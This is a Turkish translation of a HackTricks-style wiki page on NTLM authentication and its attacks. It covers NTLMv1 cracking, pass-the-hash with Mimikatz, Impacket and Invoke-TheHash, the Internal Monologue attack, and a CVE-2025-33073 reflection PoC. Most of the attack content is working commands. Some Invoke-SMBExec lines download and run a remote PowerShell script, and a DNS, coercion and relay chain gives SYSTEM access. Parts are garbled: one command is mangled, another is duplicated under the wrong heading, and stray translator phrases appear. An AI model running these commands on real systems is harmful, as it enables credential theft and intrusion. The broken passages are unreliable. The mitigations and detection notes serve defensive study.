# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

**Windows XP ve Server 2003**'ün çalışır durumda olduğu ortamlarda LM (Lan Manager) hash'leri kullanılır; ancak bunların kolayca ele geçirilebildiği yaygın olarak bilinmektedir. Belirli bir LM hash'i olan `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir durumu belirtir ve boş bir string'in hash'ini temsil eder.

Varsayılan olarak **Kerberos** authentication protocol'ü birincil yöntem olarak kullanılır. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin bulunmaması, domain'in mevcut olmaması, yanlış yapılandırma nedeniyle Kerberos'un çalışmaması veya bağlantıların geçerli bir hostname yerine IP address kullanılarak denenmesi.

Network packet'larında **"NTLMSSP"** header'ının bulunması, bir NTLM authentication process'ini gösterir.

Authentication protocol'leri olan LM, NTLMv1 ve NTLMv2 desteği `%windir%\Windows\System32\msv1\_0.dll` konumunda bulunan belirli bir DLL tarafından sağlanır.

**Key Points**:

- LM hash'leri savunmasızdır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`) bunun kullanılmadığını belirtir.
- Kerberos varsayılan authentication method'udur; NTLM yalnızca belirli koşullarda kullanılır.
- NTLM authentication packet'ları "NTLMSSP" header'ı ile tanımlanabilir.
- LM, NTLMv1 ve NTLMv2 protocol'leri `msv1\_0.dll` system file'ı tarafından desteklenir.

## LM, NTLMv1 and NTLMv2

Hangi protocol'ün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_secpol.msc_ öğesini çalıştırın -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 0'dan 5'e kadar 6 seviye vardır.

![LM, NTLMv1 ve NTLMv2 - GUI: secpol.msc öğesini çalıştırın - Local policies - Security Options - Network Security: LAN Manager authentication level. 0'dan 5'e kadar 6 seviye vardır](<../../images/image (919).png>)

### Registry

Bu işlem level 5'i ayarlayacaktır:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Olası değerler:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Temel NTLM Domain authentication Scheme

1. **user**, **credentials** bilgilerini girer
2. Client machine, **domain name** ve **username** bilgilerini göndererek bir **authentication request** gönderir
3. **server**, **challenge** gönderir
4. **client**, anahtar olarak password hash'ini kullanarak **challenge** değerini şifreler ve response olarak gönderir
5. **server**, **domain name, username, challenge ve response** bilgilerini **Domain controller**'a gönderir. Yapılandırılmış bir **Active Directory** yoksa veya domain name server'ın adıysa, credentials bilgileri **yerel olarak** kontrol edilir.
6. **domain controller**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri server'a gönderir

**server** ve **Domain Controller**, **Netlogon** server aracılığıyla bir **Secure Channel** oluşturabilir; çünkü Domain Controller, server'ın password'ünü bilir (bu parola **NTDS.DIT** db'sinin içindedir).

### Yerel NTLM authentication Scheme

Authentication, yukarıda belirtilenle aynıdır; **ancak** **server**, authenticate olmaya çalışan **user**'ın hash'ini **SAM** dosyasında bilir. Bu nedenle **Domain Controller**'a sormak yerine **server**, user'ın authenticate olup olamayacağını kendisi kontrol eder.

### NTLMv1 Challenge

**challenge uzunluğu 8 byte** ve **response uzunluğu 24 byte**'tır.

**NT hash (16byte)**, her biri **7byte** olan **3 parçaya** ayrılır (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Ardından **challenge**, her parçayla ayrı ayrı **cipher** edilir ve **cipher** edilmiş sonuç byte'ları birleştirilir. Toplam: 8B + 8B + 8B = 24Bytes.

**Sorunlar**:

- **Randomness** eksikliği
- NT hash'i bulmak için 3 parçaya ayrı ayrı **attack** gerçekleştirilebilir
- **DES crack edilebilir**
- 3. anahtar her zaman **5 sıfırdan** oluşur.
- Aynı **challenge** verildiğinde **response** aynı olur. Böylece victim'a **challenge** olarak "**1122334455667788**" string'ini verebilir ve kullanılan response'a karşı **precomputed rainbow tables** kullanarak attack gerçekleştirebilirsiniz.

### NTLMv1 attack

Unconstrained delegation modern ortamlarda daha az yaygındır, ancak erişilebilir bir **Print Spooler service**, böyle bir host'a authentication yapılmasını zorlamak için hâlâ kötüye kullanılabilir.

AD üzerinde zaten sahip olduğunuz bazı credentials/session bilgilerini kötüye kullanarak **printer**'ın **sizin kontrolünüzdeki bir host**'a karşı **authenticate olmasını** isteyebilirsiniz. Ardından `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak authentication challenge'ını 1122334455667788 olarak **ayarlayabilir**, authentication attempt'i yakalayabilir ve bu işlem **NTLMv1** kullanılarak yapıldıysa **crack edebilirsiniz**.\
`responder` kullanıyorsanız authentication'ı **downgrade** etmeyi denemek için **`--lm` flag'ini kullanmayı** deneyebilirsiniz.\
_Bu technique için authentication'ın NTLMv1 kullanılarak gerçekleştirilmesi gerektiğini unutmayın (NTLMv2 geçerli değildir)._

Printer'ın authentication sırasında computer account'ını kullanacağını ve computer account'larının **uzun ve random password'ler** kullandığını; bu password'leri yaygın **dictionaries** kullanarak **crack edemeyeceğinizi** muhtemelen unutmayın. Ancak **NTLMv1** authentication'ı **DES** kullanır ([daha fazla bilgi burada](#ntlmv1-challenge)); bu nedenle özellikle DES crack etmeye adanmış bazı service'leri kullanarak bunu crack edebilirsiniz (örneğin [https://crack.sh/](https://crack.sh) veya [https://ntlmv1.com/](https://ntlmv1.com) kullanabilirsiniz).

### hashcat ile NTLMv1 attack

NTLMv1, yakalanan NTLMv1 mesajlarını Hashcat için uygun formatlara dönüştüren [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) ile de attack edilebilir.<sup>[[1]](#references)</sup>

Komut
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
aşağıdakini çıktı olarak verirdi:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Lütfen dosya içeriğini belirtin.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat'i çalıştırın (hashtopolis gibi bir tool aracılığıyla dağıtılmış olarak çalıştırmak en iyisidir); aksi takdirde bu işlem birkaç gün sürecektir.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Bu durumda parolanın password olduğunu biliyoruz, bu nedenle demo amaçlarıyla hile yapacağız:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Şimdi kırılmış des anahtarlarını NTLM hash'inin parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Lütfen çevrilecek son kısmı paylaşın.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Lütfen birleştirilecek metinleri gönderin.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge uzunluğu 8 bayttır** ve **2 yanıt gönderilir**: Bunlardan biri **24 bayt** uzunluğundadır, **diğerinin** uzunluğu ise **değişkendir**.

**İlk yanıt**, **istemci ve domain** tarafından oluşturulan **string**'in, **key** olarak **NT hash**'inin **MD4 hash**'i kullanılarak **HMAC_MD5** ile cipher edilmesiyle oluşturulur. Ardından **result**, **challenge**'ı **HMAC_MD5** kullanarak cipher etmek için **key** olarak kullanılır. Buna 8 baytlık bir **client challenge** eklenir. Toplam: 24 B.

**İkinci yanıt**, **birkaç değer** kullanılarak oluşturulur (yeni bir client challenge, **replay attacks**'i önlemek için bir **timestamp**...)

**Başarılı bir authentication exchange** içeren bir **PCAP**'iniz varsa domain, username, server challenge ve NTLMv2 response değerlerini çıkarın, capture'ı Hashcat için formatlayın ve password recovery denemesi yapmak için `5600` modunu kullanın. Arşivlenmiş uygulamalı walkthrough, packet-field extraction prosedürünü korurken Hashcat'in örnekleri güncel kabul edilen formatı tanımlar.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Victim'ın hash'ine sahip olduğunuzda**, onu **impersonate** etmek için kullanabilirsiniz.\
Bu **hash'i kullanarak** **NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS** içine **inject** edebilirsiniz. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde**, bu **hash** kullanılır. Son seçenek mimikatz'ın yaptığı şeydir.

**Lütfen Pass-the-Hash attacks'lerini Computer accounts kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Administrator olarak çalıştırılması gerekir**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This launches a process under the current local user, while LSASS associates the supplied credentials with its outbound network logon. You can then access network resources as the supplied user, similarly to `runas /netonly`, without knowing the plaintext password.

### Pass-the-Hash Linux'tan

Linux'tan Pass-the-Hash kullanarak Windows makinelerinde code execution elde edebilirsiniz.\
[**Practical Pass-the-Hash execution examples'ı görün.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows derlenmiş araçları

[Impacket binary'lerini Windows için buradan](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries) indirebilirsiniz.

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Bu durumda bir command belirtmeniz gerekir; cmd.exe ve powershell.exe, interactive shell elde etmek için geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daha birçok Impacket binary'si vardır...

### Invoke-TheHash

Powershell script'lerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Bu function, önceki modları birleştirir. **Birden fazla host** geçebilir, seçili hedefleri hariç tutabilir ve _SMBExec, WMIExec, SMBClient_ veya _SMBEnum_ seçeneklerinden birini belirleyebilirsiniz. _**Command**_ parametresi olmadan **SMBExec** veya **WMIExec** seçerseniz yalnızca yeterli izinlere sahip olup olmadığınızı kontrol eder.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılması gerekir**

Bu araç mimikatz ile aynı şeyi yapar (LSASS belleğini değiştirir).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Kullanıcı adı ve parola ile manuel Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Bir Windows Host'tan kimlik bilgilerini çıkarma

Daha fazla bilgi için [**Stealing Windows Credentials**](../stealing-credentials/README.md) sayfasına bakın.

## Internal Monologue attack

Internal Monologue Attack, saldırganın **LSASS süreciyle doğrudan etkileşime girmeden** kurban makineden NTLM hash'lerini almasını sağlayan gizli bir kimlik bilgisi çıkarma tekniğidir. Hash'leri doğrudan bellekten okuyan ve endpoint security çözümleri veya Credential Guard tarafından sıklıkla engellenen Mimikatz'ın aksine bu saldırı, **Security Support Provider Interface (SSPI) üzerinden NTLM authentication package (MSV1_0)'a yapılan yerel çağrılardan** yararlanır. Saldırgan öncelikle NetNTLMv1'e izin verildiğinden emin olmak için **NTLM ayarlarını düşürür** (ör. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic). Ardından çalışan süreçlerden elde edilen mevcut kullanıcı token'larını taklit eder ve bilinen bir challenge kullanarak NetNTLMv1 yanıtları oluşturmak için NTLM authentication'ı yerel olarak tetikler.<sup>[[4]](#references)</sup>

Bu NetNTLMv1 yanıtlarını yakalayan saldırgan, **önceden hesaplanmış rainbow table'ları** kullanarak orijinal NTLM hash'lerini hızlıca kurtarabilir ve lateral movement için ek Pass-the-Hash saldırıları gerçekleştirebilir. Daha da önemlisi, Internal Monologue Attack network traffic oluşturmadığı, kod enjekte etmediği veya doğrudan memory dump'larını tetiklemediği için gizliliğini korur; bu da saldırganın geleneksel Mimikatz gibi yöntemlere kıyasla defender'lar tarafından tespit edilmesini zorlaştırır.

NetNTLMv1 kabul edilmiyorsa (uygulanan security policy'ler nedeniyle) saldırgan bir NetNTLMv1 yanıtı almayı başaramayabilir.

Bu durumu ele almak için Internal Monologue tool güncellendi: NetNTLMv1 başarısız olursa bile **NetNTLMv2 yanıtlarını yakalamak** için `AcceptSecurityContext()` kullanarak dinamik biçimde bir server token edinir. NetNTLMv2'nin crack edilmesi çok daha zor olsa da sınırlı durumlarda relay saldırıları veya offline brute-force için hâlâ bir yol açar.

PoC'ye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** adresinden ulaşılabilir.<sup>[[4]](#references)</sup>

## NTLM Relay ve Responder

**Bu saldırıların nasıl gerçekleştirileceğine dair daha ayrıntılı guide'ı burada okuyabilirsiniz:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Bir network capture'dan NTLM challenge'larını parse etme

**Şunu kullanabilirsiniz:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPN'ler üzerinden NTLM ve Kerberos *Reflection* (CVE-2025-33073)

Windows, bir host'tan kaynaklanan NTLM (veya Kerberos) authentication'ının SYSTEM yetkileri kazanmak amacıyla **aynı** host'a geri relay edildiği *reflection* saldırılarını önlemeye çalışan çeşitli mitigation'lar içerir.

Microsoft, MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) ve sonraki patch'lerle public chain'lerin çoğunu engelledi; ancak **CVE-2025-33073**, **marshalled** (serialized) target-info içeren Service Principal Name'leri (SPN'ler) **SMB client'ın nasıl kestiğinin** kötüye kullanılmasıyla korumaların hâlâ aşılabileceğini gösteriyor.<sup>[[5]](#references)[[6]](#references)</sup>

### Hatanın TL;DR özeti
1. Saldırgan, marshalled bir SPN'yi encode eden bir **DNS A-record** kaydeder – ör.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Kurban, PetitPotam, DFSCoerce vb. kullanılarak bu hostname'e authentication yapmaya zorlanır.
3. SMB client target string `cifs/srv11UWhRCAAAAA…` değerini `lsasrv!LsapCheckMarshalledTargetInfo`'ya ilettiğinde `CredUnmarshalTargetInfo` çağrısı **serialized blob'u çıkarır** ve geriye **`cifs/srv1`** kalır.
4. `msv1_0!SspIsTargetLocalhost` (veya Kerberos eşdeğeri), kısa host kısmı bilgisayar adıyla (`SRV1`) eşleştiği için target'ı artık *localhost* olarak değerlendirir.
5. Bunun sonucunda server `NTLMSSP_NEGOTIATE_LOCAL_CALL` değerini ayarlar ve **LSASS'in SYSTEM access-token'ını** context'e enjekte eder (Kerberos için SYSTEM işaretli bir subsession key oluşturulur).
6. Bu authentication'ı `ntlmrelayx.py` **veya** `krbrelayx.py` ile relay etmek, aynı host üzerinde tam SYSTEM yetkileri sağlar.<sup>[[5]](#references)</sup>

### Hızlı PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch ve Mitigations
* **CVE-2025-33073** için KB patch'i, `mrxsmb.sys::SmbCeCreateSrvCall` içine, hedefi marshalled info içeren herhangi bir SMB bağlantısını (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`) engelleyen bir kontrol ekler.<sup>[[5]](#references)[[6]](#references)</sup>
* Patch uygulanmamış host'larda bile reflection saldırısını önlemek için **SMB signing** zorunlu kılın.
* `*<base64>...*` biçimine benzeyen DNS kayıtlarını izleyin ve coercion vector'lerini (PetitPotam, DFSCoerce, AuthIP...) engelleyin.

### Detection fikirleri
* Client IP'sinin server IP'sinden farklı olduğu `NTLMSSP_NEGOTIATE_LOCAL_CALL` içeren network capture'ları.
* Bir subsession key ve hostname'e eşit bir client principal içeren Kerberos AP-REQ.
* Windows Event 4624/4648 SYSTEM logon'larının hemen ardından aynı host'tan gelen remote SMB write işlemleri.<sup>[[5]](#references)</sup>

**Mart 2026** tarihindeki, **SMB arbitrary ports** ve **TCP connection reuse** kullanan ve `NT AUTHORITY\SYSTEM` seviyesine ulaşan local reflection varyantı için bkz.:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS'e Dokunmadan NTLM Hash'lerini Alma](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection Öldü, Yaşasın NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Bir NTLMv2 Hash'ini Cracking Etme – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
